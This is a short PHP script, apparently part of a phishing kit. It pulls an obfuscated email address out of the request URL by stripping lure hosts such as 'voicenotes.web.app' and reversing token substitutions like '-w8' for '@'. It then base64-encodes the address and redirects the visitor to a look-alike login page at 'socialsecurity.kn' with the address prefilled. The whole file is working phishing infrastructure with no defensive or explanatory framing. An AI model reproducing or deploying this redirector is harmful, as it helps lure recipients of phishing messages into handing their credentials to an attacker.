<?php

$url = "$_SERVER[REQUEST_URI]";

$fbase1 = str_replace("quar323a.web.app", "", $url);
$fbase2 = str_replace("voicenotes.web.app", "", $fbase1);
$fbase3 = str_replace("vm281021.web.app", "", $fbase2);
$fbase4 = str_replace("?url=https:", "", $fbase3);

$p0 = str_replace("/", "", $fbase4);
$p1 = str_replace("-w8", "@", $p0);
$p2 = str_replace("-9a", ".", $p1);
$p3 = str_replace("-8p", "c", $p2);
$p4 = str_replace("-0d", "o", $p3);
$p5 = str_replace("(", "", $p4);
$p6 = str_replace(")", "", $p5);
$p7 = str_replace(" ", "", $p6);
$p8 = str_replace("%20", "", $p7);
$p9 = str_replace("9y-", "e", $p8);
$p10 = str_replace("  ", "", $p9);



$final = strtolower($p10);

function Redirect($url, $permanent = false)
{
 if (headers_sent() === false)
 {
 header('Location: ' . $url, true, ($permanent === true) ? 301 : 302);
 }

 exit();
}

Redirect("https://socialsecurity.kn/auth01/?client-request-id=".base64_encode($final)."", false);

?>
